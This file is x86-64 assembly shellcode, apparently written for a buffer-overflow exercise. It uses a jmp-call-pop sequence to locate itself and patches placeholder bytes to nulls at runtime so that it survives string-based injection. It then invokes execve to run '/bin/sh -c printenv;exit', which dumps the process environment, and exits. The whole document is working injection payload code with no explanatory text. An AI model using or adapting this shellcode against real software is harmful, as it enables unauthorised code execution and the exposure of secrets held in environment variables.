          bits 64
            ; find out where we are
start:     jmp short codeEnd
start2:    pop rsi

            ; clear the a register
           xor rax,rax

            ; restore null bytes to data (setting null where 'x' is)
           mov [rsi+flagStr-exeStr-2],al
           mov [rsi+cmdStr-exeStr-1],al
           mov [rsi+arrayAddr-exeStr-1],al
           mov [rsi+arrayAddr-exeStr+24],rax

           mov [rsi+arrayAddr-exeStr],rsi 
           lea rdi, [byte rsi+flagStr-exeStr]
           mov [rsi+arrayAddr-exeStr+8],rdi
           lea rdi, [byte rsi+cmdStr-exeStr]
           mov [rsi+arrayAddr-exeStr+16],rdi

           mov rdx, rsp
           shr rdx, 32
           shl rdx, 32

           mov rcx, 0xf7fbe6FF
           xor cl, cl
           or rdx, rcx
           mov rdx, [rdx]


            ; execve system call 
            ; 0x3b
           mov al,0x3b
           mov rdi,rsi
           lea rsi,[rsi+arrayAddr-exeStr]
           syscall

            ; exit system call
           mov al,0x3c
           mov rdi, rax
           syscall

codeEnd:   call start2
            ; data
exeStr:    db "/bin/shXy"
flagStr:   db "-cX"
cmdStr:    db "printenv;exitX"
arrayAddr: dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
newAddr: dq newAddr-start